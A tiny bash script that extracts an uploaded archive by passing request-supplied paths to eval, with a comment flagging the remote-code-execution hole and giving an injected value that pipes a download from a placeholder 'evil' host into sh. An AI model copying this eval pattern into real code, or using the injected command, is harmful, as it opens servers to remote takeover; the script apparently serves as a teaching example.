#!/bin/bash
# unpack an upload — archive/dest come from a request
archive="$1"
dest="$2"
eval "tar -xf $archive -C $dest"   # archive='x.tar; curl evil|sh' -> RCE; also word-splits
